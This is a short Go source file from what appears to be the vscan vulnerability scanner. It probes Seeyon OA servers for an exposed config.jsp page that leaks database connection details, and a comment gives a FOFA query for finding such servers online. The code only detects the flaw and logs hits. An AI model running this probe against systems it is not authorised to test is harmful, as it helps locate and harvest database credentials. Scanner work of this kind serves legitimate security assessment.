package seeyon

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

//config.jsp 敏感信息泄漏漏洞
//fofa body="yyoa" && app="致远互联-OA"

func ConfigInfo(u string) bool {
	if req, err := pkg.HttpRequset(u+"/yyoa/ext/trafaxserver/SystemManage/config.jsp", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "jdbc") && strings.Contains(req.Body, "DatabaseName") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln seeyon config.jsp|%s\n", u+"/yyoa/ext/trafaxserver/SystemManage/config.jsp"))
			return true
		}
	}
	return false
}
